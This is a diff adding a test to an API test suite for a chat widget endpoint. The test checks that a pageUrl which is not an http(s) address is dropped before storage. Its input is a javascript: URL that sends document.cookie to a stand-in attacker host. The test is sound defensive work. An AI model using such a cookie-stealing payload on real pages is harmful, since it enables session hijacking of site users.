@@ -109,6 +109,22 @@ describe('POST /api/widget/chat', () => {
     expect(holder.answers).toHaveLength(0);
   });
 
+  it('drops a page url that is not an http(s) address instead of storing it', async () => {
+    const planted = await post(
+      body({ pageUrl: "javascript:fetch('//attacker.example/'+document.cookie)" }),
+    );
+    expect(planted.status).toBe(200);
+    await planted.text();
+
+    const relative = await post(body({ pageUrl: '/docs' }));
+    expect(relative.status).toBe(200);
+    await relative.text();
+
+    expect(holder.answers).toHaveLength(2);
+    expect((holder.answers[0] as AnswerParams).conversation.pageUrl).toBeUndefined();
+    expect((holder.answers[1] as AnswerParams).conversation.pageUrl).toBeUndefined();
+  });
+
   it('answers 404 for an unknown key', async () => {
     const response = await post(body({ key: 'pb_ffffffffffffffffffffffffffffffff' }));
 
